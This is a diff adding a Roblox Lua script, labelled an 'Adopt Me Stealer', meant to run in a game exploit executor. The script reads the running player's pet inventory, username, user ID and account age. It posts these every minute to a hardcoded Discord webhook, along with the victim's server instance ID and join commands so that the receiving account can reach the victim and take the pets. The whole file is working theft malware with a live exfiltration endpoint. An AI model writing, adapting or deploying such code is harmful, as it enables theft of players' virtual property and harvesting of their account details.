@@ -1,0 +1,199 @@
+local Username = "preppymacdo1"
+local Webhook = "https://discord.com/api/webhooks/1538642669297860609/Yw2UGwMKHYaOo92rGcbG3tp_9RDSK4HEHRdwi-uqFXtH6iTmuc_xxHDXtyViBoUWS7Mb"
+
+local Loaders = require(game.ReplicatedStorage.Fsys).load
+local InventoryDB = Loaders("InventoryDB")
+local ClientData = Loaders("ClientData")
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local plr = game.Players.LocalPlayer
+local playerData = clientData.get_data()[tostring(plr)]
+
+local stats = {
+    neon_count = 0,
+    mega_neon_count = 0,
+    flyable_count = 0,
+    rideable_count = 0,
+    legendaries_count = 0,
+    ultra_count = 0,
+    rare_count = 0,
+    uncommon_count = 0,
+    common_count = 0,
+    fr_count = 0,
+    total = 0
+}
+
+if playerData and playerData.inventory and playerData.inventory.pets then
+    for _, petData in pairs(playerData.inventory.pets) do
+        if petData.properties and type(petData.properties) == "table" then
+            if petData.properties.neon then stats.neon_count = stats.neon_count + 1 end
+            if petData.properties.mega_neon then stats.mega_neon_count = stats.mega_neon_count + 1 end
+            if petData.properties.flyable then stats.flyable_count = stats.flyable_count + 1 end
+            if petData.properties.rideable then stats.rideable_count = stats.rideable_count + 1 end
+            if petData.properties.rideable and petData.properties.flyable then stats.fr_count = stats.fr_count + 1 end
+        end
+    end
+end
+
+local inventoryData = ClientData.get("inventory")
+if inventoryData and inventoryData.pets then
+    for i, v in pairs(inventoryData.pets) do
+        if InventoryDB and InventoryDB[v.category] and InventoryDB[v.category][v.id] then
+            local petData = InventoryDB[v.category][v.id]
+            if petData.rarity == "legendary" then
+                stats.legendaries_count = stats.legendaries_count + 1
+            elseif petData.rarity == "ultra_rare" then
+                stats.ultra_count = stats.ultra_count + 1
+            elseif petData.rarity == "rare" then
+                stats.rare_count = stats.rare_count + 1
+            elseif petData.rarity == "uncommon" then
+                stats.uncommon_count = stats.uncommon_count + 1
+            elseif petData.rarity == "common" then
+                stats.common_count = stats.common_count + 1
+            end
+        end
+    end
+end
+
+if stats.legendaries_count == 1 then
+    stats.legendaries_count = 0
+elseif stats.legendaries_count > 1 then
+    stats.legendaries_count = stats.legendaries_count - 1
+end
+
+if stats.ultra_count == 1 then
+    stats.ultra_count = 0
+elseif stats.ultra_count > 1 then
+    stats.ultra_count = stats.ultra_count - 1
+end
+
+if stats.rare_count == 1 then
+    stats.rare_count = 0
+elseif stats.rare_count > 1 then
+    stats.rare_count = stats.rare_count - 1
+end
+
+if stats.common_count == 1 then
+    stats.common_count = 0
+elseif stats.common_count > 1 then
+    stats.common_count = stats.common_count - 2
+end
+
+stats.total = stats.legendaries_count + stats.ultra_count + stats.rare_count + stats.uncommon_count + stats.common_count
+
+local exploit = identifyexecutor() or "Unknown"
+local userid = plr.UserId
+local accage = plr.AccountAge
+
+local data = {
+    username = 'Kenn | Adopt Me Stealer!!',
+    content = '-- [[@everyone]]\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "cbaf4fed-5c00-4953-921c-9dcba2a25853")',
+    embeds = {{
+        title = '**New Hits! Bule dongo aselole**',
+        description = '**〘👤〙Player Info**: \n ```lua\nExecutor 🔌: '.. tostring(exploit) ..'\nUsername 🧑: '.. tostring(plr.Name) ..'\nUser-ID  🚀: '.. tostring(userid) ..'\nAcc Age  🌠: '.. tostring(accage) ..' Days\nReceiver 💌: '.. Username ..'\n```\n **⟪🎒⟫ Inventory**: \n ```lua\nLegendaries 🦒: '.. tostring(stats.legendaries_count).. '\nUltra Rares 🐊: '.. tostring(stats.ultra_count).. '\nRares       🐌: '.. tostring(stats.rare_count).. '\nUncommons   🦀: '.. tostring(stats.uncommon_count).. '\nCommons     🐱: '.. tostring(stats.common_count).. '\nTotal Pets  🤑: '.. tostring(stats.total).. '\n\nMega-Neon   🐉: '.. tostring(stats.mega_neon_count).. '\nNeon Only   🐲: '.. tostring(stats.neon_count).. '\nF/R Pets    🦄: '.. tostring(stats.fr_count).. '```\n**Claim All Script 🎁**:\n```lua\n-- Coming Soon.```\n\n**Join from Console**: \n```lua\nRoblox.GameLauncher.joinGameInstance(142823291, "cbaf4fed-5c00-4953-921c-9dcba2a25853")```',
+        color = 14423100,
+        footer = { text = "Time: " .. os.date("%Y-%m-%d %H:%M:%S") }
+    }}
+}
+
+local HttpService = game:GetService('HttpService')
+local httpRequest = http.request or httprequest
+
+if httpRequest then
+    pcall(function()
+        httpRequest({
+            Url = Webhook,
+            Method = 'POST',
+            Headers = { ['Content-Type'] = 'application/json' },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end
+
+while wait(60) do
+    local newPlayerData = clientData.get_data()[tostring(plr)]
+    stats = {
+        neon_count = 0,
+        mega_neon_count = 0,
+        flyable_count = 0,
+        rideable_count = 0,
+        legendaries_count = 0,
+        ultra_count = 0,
+        rare_count = 0,
+        uncommon_count = 0,
+        common_count = 0,
+        fr_count = 0,
+        total = 0
+    }
+    
+    if newPlayerData and newPlayerData.inventory and newPlayerData.inventory.pets then
+        for _, petData in pairs(newPlayerData.inventory.pets) do
+            if petData.properties and type(petData.properties) == "table" then
+                if petData.properties.neon then stats.neon_count = stats.neon_count + 1 end
+                if petData.properties.mega_neon then stats.mega_neon_count = stats.mega_neon_count + 1 end
+                if petData.properties.flyable then stats.flyable_count = stats.flyable_count + 1 end
+                if petData.properties.rideable then stats.rideable_count = stats.rideable_count + 1 end
+                if petData.properties.rideable and petData.properties.flyable then stats.fr_count = stats.fr_count + 1 end
+            end
+        end
+    end
+    
+    local newInventoryData = ClientData.get("inventory")
+    if newInventoryData and newInventoryData.pets then
+        for i, v in pairs(newInventoryData.pets) do
+            if InventoryDB and InventoryDB[v.category] and InventoryDB[v.category][v.id] then
+                local petData = InventoryDB[v.category][v.id]
+                if petData.rarity == "legendary" then
+                    stats.legendaries_count = stats.legendaries_count + 1
+                elseif petData.rarity == "ultra_rare" then
+                    stats.ultra_count = stats.ultra_count + 1
+                elseif petData.rarity == "rare" then
+                    stats.rare_count = stats.rare_count + 1
+                elseif petData.rarity == "uncommon" then
+                    stats.uncommon_count = stats.uncommon_count + 1
+                elseif petData.rarity == "common" then
+                    stats.common_count = stats.common_count + 1
+                end
+            end
+        end
+    end
+    
+    if stats.legendaries_count == 1 then
+        stats.legendaries_count = 0
+    elseif stats.legendaries_count > 1 then
+        stats.legendaries_count = stats.legendaries_count - 1
+    end
+    
+    if stats.ultra_count == 1 then
+        stats.ultra_count = 0
+    elseif stats.ultra_count > 1 then
+        stats.ultra_count = stats.ultra_count - 1
+    end
+    
+    if stats.rare_count == 1 then
+        stats.rare_count = 0
+    elseif stats.rare_count > 1 then
+        stats.rare_count = stats.rare_count - 1
+    end
+    
+    if stats.common_count == 1 then
+        stats.common_count = 0
+    elseif stats.common_count > 1 then
+        stats.common_count = stats.common_count - 2
+    end
+    
+    stats.total = stats.legendaries_count + stats.ultra_count + stats.rare_count + stats.uncommon_count + stats.common_count
+    
+    data.embeds[1].description = '**〘👤〙Player Info**: \n ```lua\nExecutor 🔌: '.. tostring(exploit) ..'\nUsername 🧑: '.. tostring(plr.Name) ..'\nUser-ID  🚀: '.. tostring(userid) ..'\nAcc Age  🌠: '.. tostring(accage) ..' Days\nReceiver 💌: '.. Username ..'\n```\n **⟪🎒⟫ Inventory**: \n ```lua\nLegendaries 🦒: '.. tostring(stats.legendaries_count).. '\nUltra Rares 🐊: '.. tostring(stats.ultra_count).. '\nRares       🐌: '.. tostring(stats.rare_count).. '\nUncommons   🦀: '.. tostring(stats.uncommon_count).. '\nCommons     🐱: '.. tostring(stats.common_count).. '\nTotal Pets  🤑: '.. tostring(stats.total).. '\n\nMega-Neon   🐉: '.. tostring(stats.mega_neon_count).. '\nNeon Only   🐲: '.. tostring(stats.neon_count).. '\nF/R Pets    🦄: '.. tostring(stats.fr_count).. '```\n**Claim All Script 🎁**:\n```lua\n-- Coming Soon.```\n\n**Join from Console**: \n```lua\nRoblox.GameLauncher.joinGameInstance(142823291, "cbaf4fed-5c00-4953-921c-9dcba2a25853")```'
+    data.embeds[1].footer.text = "Time: " .. os.date("%Y-%m-%d %H:%M:%S")
+    
+    if httpRequest then
+        pcall(function()
+            httpRequest({
+                Url = Webhook,
+                Method = 'POST',
+                Headers = { ['Content-Type'] = 'application/json' },
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end
+end
